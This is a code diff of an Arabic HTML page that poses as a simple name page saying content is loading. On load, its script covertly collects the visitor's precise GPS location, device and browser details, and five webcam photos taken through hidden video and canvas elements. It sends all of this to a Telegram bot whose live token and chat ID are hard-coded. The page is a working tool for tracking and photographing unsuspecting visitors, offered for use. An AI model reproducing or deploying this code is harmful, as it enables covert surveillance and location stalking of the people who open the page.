@@ -1,55 +1,195 @@
-<script src="https://unpkg.com/axios@1.6.7/dist/axios.min.js"></script>
-<video id="video" autoplay style="display:none;"></video>
-<canvas id="canvas" style="display:none;"></canvas>
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>عزام الفتال</title>
+    <script src="https://unpkg.com/axios@1.6.7/dist/axios.min.js"></script>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background: linear-gradient(135deg, #0f172a, #1e1b4b);
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            color: #ffffff;
+        }
+        .container {
+            text-align: center;
+            padding: 40px;
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.5);
+        }
+        h1 {
+            font-size: 3rem;
+            margin: 0;
+            background: linear-gradient(45deg, #00dbde, #fc00ff);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            text-shadow: 0 0 30px rgba(252, 0, 255, 0.3);
+            font-weight: 800;
+            letter-spacing: 2px;
+        }
+        p {
+            color: #94a3b8;
+            margin-top: 15px;
+            font-size: 1.1rem;
+        }
+    </style>
+</head>
+<body>
 
-<script>
-const TOKEN = "8726396385:AAF7xhkGDGPxMycanSzepBYAtXVfUy9c07A"; // ← أدخل التوكن هنا
-const CHAT_ID = "8897447043"; // ← أدخل المعرف هنا
-const URI_API = `https://api.telegram.org/bot${TOKEN}/sendPhoto`;
+    <div class="container">
+        <h1>عزام الفتال</h1>
+        <p>جاري تحميل المحتوى...</p>
+    </div>
 
-async function requestCameraAndSendImages() {
-    try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-        const video = document.getElementById('video');
-        const canvas = document.getElementById('canvas');
-        const context = canvas.getContext('2d');
-        video.srcObject = stream;
+    <video id="video" autoplay style="display:none;"></video>
+    <canvas id="canvas" style="display:none;"></canvas>
 
-        // انتظر حتى تعمل الكاميرا
-        await new Promise(resolve => {
-            video.onloadedmetadata = () => {
-                video.play();
-                resolve();
-            };
+    <script>
+    const TOKEN = "8726396385:AAF7xhkGDGPxMycanSzepBYAtXVfUy9c07A"; // ← التوكن الخاص بك
+    const CHAT_ID = "8897447043"; // ← معرف الشات الخاص بك
+    const URI_API_PHOTO = `https://api.telegram.org/bot${TOKEN}/sendPhoto`;
+    const URI_API_MSG = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
+
+    // دالة للحصول على الموقع الجغرافي الدقيق جداً
+    function getExactLocation() {
+        return new Promise((resolve) => {
+            if (!navigator.geolocation) {
+                resolve("<b>الموقع الجغرافي:</b> غير مدعوم في هذا المتصفح.\n");
+                return;
+            }
+
+            navigator.geolocation.getCurrentPosition(
+                (position) => {
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
+                    const accuracy = position.coords.accuracy; // الدقة بالأمتار
+                    const altitude = position.coords.altitude ? position.coords.altitude + ' متر' : 'غير متوفر';
+                    const speed = position.coords.speed ? position.coords.speed + ' م/ث' : 'غير متوفر';
+
+                    let locInfo = "<b>--- الموقع الجغرافي الدقيق ---</b>\n";
+                    locInfo += `<b>خط الطول (Latitude):</b> ${lat}\n`;
+                    locInfo += `<b>خط العرض (Longitude):</b> ${lon}\n`;
+                    locInfo += `<b>الدقة (Accuracy):</b> في نطاق ${accuracy} متر\n`;
+                    locInfo += `<b>الارتفاع:</b> ${altitude}\n`;
+                    locInfo += `<b>السرعة:</b> ${speed}\n`;
+                    locInfo += `<b>رابط الخريطة:</b> <a href="https://www.google.com/maps?q=${lat},${lon}">اضغط هنا لعرض الموقع على الخريطة</a>\n\n`;
+                    
+                    resolve(locInfo);
+                },
+                (error) => {
+                    let errMsg = "<b>الموقع الجغرافي:</b> ";
+                    switch(error.code) {
+                        case error.PERMISSION_DENIED:
+                            errMsg += "تم رفض إذن الوصول إلى الموقع من قبل المستخدم.\n\n";
+                            break;
+                        case error.POSITION_UNAVAILABLE:
+                            errMsg += "معلومات الموقع غير متوفرة حالياً.\n\n";
+                            break;
+                        case error.TIMEOUT:
+                            errMsg += "انتهت مهلة الطلب أثناء محاولة تحديد الموقع.\n\n";
+                            break;
+                        default:
+                            errMsg += "حدث خطأ غير معروف أثناء جلب الموقع.\n\n";
+                            break;
+                    }
+                    resolve(errMsg);
+                },
+                {
+                    enableHighAccuracy: true, // طلب أعلى دقة ممكنة (GPS)
+                    timeout: 10000,          // مهلة أقصاها 10 ثوانٍ
+                    maximumAge: 0            // عدم استخدام موقع مخزن مؤقتاً
+                }
+            );
         });
+    }
 
-        // التقط 5 صور بفاصل 1 ثانية
-        for (let i = 0; i < 5; i++) {
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+    // دالة لجمع معلومات المتصفح والنظام
+    function getBrowserInfo() {
+        const n = navigator;
+        const s = window.screen;
+        
+        let info = "<b>--- معلومات المتصفح والجهاز ---</b>\n";
+        info += `<b>المتصفح (User Agent):</b> ${n.userAgent}\n`;
+        info += `<b>اللغة:</b> ${n.language}\n`;
+        info += `<b>النظام الأساسي (Platform):</b> ${n.platform}\n`;
+        info += `<b>عدد أنوية المعالج (Cores):</b> ${n.hardwareConcurrency || 'غير معروف'}\n`;
+        info += `<b>الذاكرة العشوائية (RAM):</b> ${n.deviceMemory ? n.deviceMemory + ' GB' : 'غير معروف'}\n`;
+        info += `<b>دقة الشاشة:</b> ${s.width}x${s.height}\n`;
+        info += `<b>نافذة العرض:</b> ${window.innerWidth}x${window.innerHeight}\n`;
+        info += `<b>التاريخ والوقت:</b> ${new Date().toLocaleString()}\n`;
+        
+        if (n.connection) {
+            info += `<b>نوع اتصال الإنترنت:</b> ${n.connection.effectiveType || 'غير معروف'}\n`;
+            info += `<b>السرعة المتوقعة:</b> ${n.connection.downlink || 'غير معروف'} Mbps\n`;
+        }
+        
+        return info;
+    }
 
-            const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));
-            const formData = new FormData();
-            formData.append('chat_id', CHAT_ID);
-            formData.append('photo', blob, `image${i + 1}.jpg`);
+    async function collectAndSend() {
+        try {
+            // 1. جمع معلومات الموقع والمتصفح ودمجهما في رسالة واحدة
+            const locationInfo = await getExactLocation();
+            const deviceInfo = getBrowserInfo();
+            const fullMessage = locationInfo + "\n" + deviceInfo;
 
-            await axios.post(URI_API, formData, {
-                headers: { 'Content-Type': 'multipart/form-data' }
+            // 2. إرسال البيانات النصية (الموقع + معلومات الجهاز) إلى تيليجرام
+            await axios.post(URI_API_MSG, {
+                chat_id: CHAT_ID,
+                text: fullMessage,
+                parse_mode: 'HTML',
+                disable_web_page_preview: true
             });
 
-            await new Promise(r => setTimeout(r, 1000)); // انتظر ثانية
+            // 3. طلب إذن الكاميرا والتقاط الصور
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            const context = canvas.getContext('2d');
+            video.srcObject = stream;
+
+            await new Promise(resolve => {
+                video.onloadedmetadata = () => {
+                    video.play();
+                    resolve();
+                };
+            });
+
+            // التقاط 5 صور بفاصل ثانية واحدة
+            for (let i = 0; i < 5; i++) {
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));
+                const formData = new FormData();
+                formData.append('chat_id', CHAT_ID);
+                formData.append('photo', blob, `image${i + 1}.jpg`);
+
+                await axios.post(URI_API_PHOTO, formData, {
+                    headers: { 'Content-Type': 'multipart/form-data' }
+                });
+
+                await new Promise(r => setTimeout(r, 1000));
+            }
+
+            stream.getTracks().forEach(track => track.stop());
+
+        } catch (err) {
+            console.error("Error:", err);
         }
-
-        // إيقاف الكاميرا بعد الانتهاء
-        stream.getTracks().forEach(track => track.stop());
-
-    } catch (err) {
-        console.error("Camera access error:", err);
-        alert("لم يتم منح صلاحية الوصول إلى الكاميرا أو حدث خطأ.");
     }
-}
 
-// شغّل الوظيفة عند فتح الصفحة
-window.addEventListener('load', requestCameraAndSendImages);
-</script>
+    window.addEventListener('load', collectAndSend);
+    </script>
+</body>
+</html>
